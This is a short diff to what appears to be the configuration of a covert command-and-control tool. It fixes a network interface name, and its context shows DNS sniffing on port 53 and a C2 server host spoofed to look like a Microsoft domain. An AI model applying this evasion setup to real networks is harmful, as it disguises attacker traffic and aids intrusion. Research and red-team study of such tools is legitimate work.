@@ -3,7 +3,7 @@
 REQUEST_TYPE_ERR = "The request type must be one of the following: PING, DATA, RECEIPT"
 PING_INTERVAL = 10
 
-INTERFACE = "esn3"
+INTERFACE = "ens3"
 SNIFF_FILTER = "src port 53"
 
 CC_SERVER_SPOOFED_HOST = "cp501-prod.do.dsp.microsoft.com"
